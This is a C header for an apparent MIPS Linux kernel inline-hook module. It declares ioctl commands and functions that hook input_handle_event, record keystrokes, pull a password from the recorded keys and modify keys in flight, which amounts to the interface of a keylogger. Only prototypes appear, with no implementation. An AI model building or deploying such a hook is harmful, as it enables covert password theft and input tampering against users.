//
// Created by CHM on 2021/4/10.
//

#ifndef MIPS_INLINEHOOK_COMMON_H
#define MIPS_INLINEHOOK_COMMON_H


#include <linux/ioctl.h>
#include <linux/kallsyms.h>

#define KEY_PRESSED     1
#define KEY_RELEASED    0


#define KBDDEV_IOC_MAGIC    'x'
#define KBDDEV_IOC_GETKEYS                  _IOR(KBDDEV_IOC_MAGIC, 0, int)      // 获取记录的按键信息
#define KBDDEV_IOC_CLEARKEYS                _IO(KBDDEV_IOC_MAGIC, 1)            // 清空记录按键信息的缓冲区
#define KBDDEV_IOC_START_RECORD_KEYS        _IOR(KBDDEV_IOC_MAGIC, 2, int)      // 开始记录按键信息
#define KBDDEV_IOC_STOP_RECORD_KEYS         _IOR(KBDDEV_IOC_MAGIC, 3, int)      // 停止记录按键信息

void install_hook_input_handle_event(void);

void key_store_add_a_key(unsigned char key);

void key_store_delete_a_key(void);

void key_store_clear(void);

int get_passwd_from_key_store(unsigned char * buf);

void key_store_record(unsigned char key);

void modify_current_key_method1(unsigned long * key);

bool set_key_record_status(bool status);

bool get_key_record_status(void);

#endif //MIPS_INLINEHOOK_COMMON_H
